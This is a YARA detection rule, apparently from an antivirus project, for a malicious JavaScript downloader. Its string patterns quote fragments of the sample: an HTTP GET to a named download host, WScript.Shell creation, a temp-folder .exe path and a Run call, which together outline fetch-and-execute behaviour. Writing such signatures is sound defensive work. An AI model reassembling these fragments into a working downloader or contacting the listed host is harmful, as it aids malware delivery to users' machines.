rule sig_20160330_ae84acaf5ee4a4d9c9b7325a1bedca85 {
  meta:
    description = "datamaliciousorder - file 20160330_ae84acaf5ee4a4d9c9b7325a1bedca85.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "59a3db6abe2fa2d3babca26ad4c80148af5ff102b53d364ec8b072c517a1a4f0"

  strings:
    $s1  = "KL[F](\"GET\", \"http://be-stlines-tore.com/u3rsap\", false);" fullword ascii
    $s2  = "function L0(PN, K0){B0 = B0 * 1; return PN - K0;};" fullword ascii
    $s3  = "var L2 = function H() {return WScript[C](\"WScript\"+\".Shell\");}(), XR = 11;" fullword ascii
    $s4  = "if (KL[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function L(){return Y1 + \"\";};" fullword ascii
    $s6  = "function EL() {return L2[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"5vdIG1CkFP9zc.ex\" + \"e\";};" fullword ascii
    $s7  = "function ZW() {return ((KU == true) && (KU == L1)) ? 1 : B0;};" fullword ascii
    $s8  = "function GL(Q0){L2[\"Run\"](Q0, B0, B0);};" fullword ascii
    $s9  = "function B(){return 22;};" fullword ascii
    $s10 = "function G()" fullword ascii
    $s11 = "}while (Q);" fullword ascii
    $s12 = "var US = new this[\"Date\"]();" fullword ascii
    $s13 = "function Y(K) {var LC = (1, 2, 3, 4, 5, K); return LC;};" fullword ascii
    $s14 = "return L0(UW, FD);" fullword ascii
    $s15 = "function HH(){return C;};" fullword ascii
    $s16 = "var KU = false;" fullword ascii
    $s17 = "var L1 = false;" fullword ascii
    $s18 = "L1 = true; " fullword ascii
    $s19 = "KU = true; " fullword ascii
    $s20 = "} catch(FV){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}